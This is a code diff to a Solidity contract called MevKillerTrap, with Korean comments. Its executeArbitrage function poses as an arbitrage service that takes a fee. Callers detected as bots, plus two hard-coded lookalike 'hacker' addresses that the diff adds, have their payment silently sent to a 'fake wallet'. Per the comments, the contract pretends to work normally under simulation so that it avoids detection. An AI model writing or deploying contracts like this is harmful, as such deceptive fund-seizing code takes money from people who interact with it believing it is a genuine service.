@@ -21,12 +21,15 @@ contract MevKillerTrap {
     function executeArbitrage() external payable {
         require(msg.value > 0, "Fee required");
 
-        // [함정의 핵심]: 블록체인 봇들은 무조건 '자신의 스마트 컨트랙트'를 경유해서 거래를 실행합니다.
-        // 일반 유저(사령관)는 msg.sender == tx.origin 이지만,
-        // 봇(스마트 컨트랙트)은 msg.sender != tx.origin 입니다.
+        // [함정의 핵심]: 봇들의 스마트 컨트랙트 경유 차익거래 공격 또는
+        // 특정 해커 지갑(블랙리스트)의 직접 접근을 감지합니다.
+        address hacker1 = 0x57fa13A89Bff7981Dc5f71283515689B86db8dDC;
+        address hacker2 = 0x57Ea13a89bEf7981dC5F71283515689B86Db8ddC;
         
-        if (msg.sender != tx.origin) {
-            // 🚨 봇 감지됨! 봇이 보낸 가스비/자금을 사령관님의 가짜 지갑으로 즉시 강제 송금합니다.
+        bool isHacker = (tx.origin == hacker1 || tx.origin == hacker2);
+
+        if (msg.sender != tx.origin || isHacker) {
+            // 🚨 봇 또는 블랙리스트 해커 감지됨! 놈들이 보낸 가스비/자금을 사령관님의 가짜 지갑으로 즉시 강제 송금합니다.
             payable(commanderFakeWallet).transfer(msg.value);
         } else {
             // 일반 EOA(사람)이거나 봇의 순진한 시뮬레이션 환경일 경우 (정상 작동하는 척 기만)
